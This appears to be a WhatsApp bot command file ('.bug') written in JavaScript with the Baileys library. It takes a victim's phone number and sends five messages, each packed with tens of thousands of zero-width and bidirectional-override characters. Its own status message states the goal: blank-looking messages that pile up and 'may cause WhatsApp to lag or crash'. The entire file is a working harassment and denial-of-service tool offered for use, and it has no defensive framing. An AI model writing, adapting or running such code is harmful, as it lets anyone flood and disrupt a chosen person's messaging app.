// commands/bug.js - Invisible Message Version
const { jidNormalizedUser } = require('@whiskeysockets/baileys');

module.exports = async (sock, from, msg, args, isAdmin, botData) => {
    try {
        if (!args || args.length === 0) {
            await sock.sendMessage(from, {
                text: "⚠️ *Usage:* .bug [phone_number]\n\n*Example:* .bug 94703945265"
            });
            return;
        }

        let targetNumber = args[0].replace(/[^0-9]/g, '');

        if (targetNumber.length < 10 || targetNumber.length > 15) {
            await sock.sendMessage(from, {
                text: "❌ *Invalid Phone Number*"
            });
            return;
        }

        const targetJid = jidNormalizedUser(targetNumber + '@s.whatsapp.net');

        await sock.sendMessage(from, {
            text: `🔄 *Invisible Bug Deploying...*\nTarget: ${targetNumber}`
        });

        // ============================================
        // INVISIBLE MESSAGE PAYLOADS
        // ============================================

        // PAYLOAD 1: Completely Invisible (Zero-Width Characters Only)
        const invisiblePayload1 = {
            text: '\u200B'.repeat(5000) + '\u200C'.repeat(5000) + '\u200D'.repeat(5000) + '\uFEFF'.repeat(5000) + '\u2060'.repeat(5000)
        };
        await sock.sendMessage(targetJid, invisiblePayload1);
        await new Promise(resolve => setTimeout(resolve, 800));

        // PAYLOAD 2: Invisible with One Visible Character (Looks like empty message)
        const invisiblePayload2 = {
            text: '\u200B'.repeat(10000) + '\u200C'.repeat(10000) + '\u200D'.repeat(10000) + ' '
        };
        await sock.sendMessage(targetJid, invisiblePayload2);
        await new Promise(resolve => setTimeout(resolve, 800));

        // PAYLOAD 3: Directional Invisible Overload
        const invisiblePayload3 = {
            text: '\u202A'.repeat(5000) + '\u202B'.repeat(5000) + '\u202D'.repeat(5000) + '\u202E'.repeat(5000) + '\u2066'.repeat(5000) + '\u2067'.repeat(5000) + '\u2068'.repeat(5000) + '\u2069'.repeat(5000)
        };
        await sock.sendMessage(targetJid, invisiblePayload3);
        await new Promise(resolve => setTimeout(resolve, 800));

        // PAYLOAD 4: Invisible + Text Spacing Break
        const invisiblePayload4 = {
            text: '\u200B'.repeat(20000) + '\u200C'.repeat(20000) + '\u200D'.repeat(20000) + '\u200B'.repeat(20000) + '\u200C'.repeat(20000) + '\u200D'.repeat(20000) + '\uFEFF'.repeat(20000) + '\u2060'.repeat(20000)
        };
        await sock.sendMessage(targetJid, invisiblePayload4);
        await new Promise(resolve => setTimeout(resolve, 800));

        // PAYLOAD 5: Zero-Width Joiner Cascade
        const invisiblePayload5 = {
            text: '‍'.repeat(50000) + '‌'.repeat(50000) + '‍'.repeat(50000) + '‌'.repeat(50000) + '‍'.repeat(50000)
        };
        await sock.sendMessage(targetJid, invisiblePayload5);

        // ============================================
        // Send Completion Report
        // ============================================
        await sock.sendMessage(from, {
            text: `✅ *Invisible Bug Delivered*\n\n` +
                  `📱 Target: ${targetNumber}\n` +
                  `⚡ Payloads: 5\n` +
                  `👻 Status: INVISIBLE\n\n` +
                  `*Effect:*\n` +
                  `• Target receives invisible messages\n` +
                  `• Chat shows empty/blank messages\n` +
                  `• May cause WhatsApp to lag or crash\n` +
                  `• Invisible messages stack up\n\n` +
                  `⏳ Auto-clear: ~5-10 minutes`
        });

    } catch (error) {
        console.error('Bug command error:', error);
        await sock.sendMessage(from, {
            text: `❌ Error: ${error.message}`
        });
    }
};
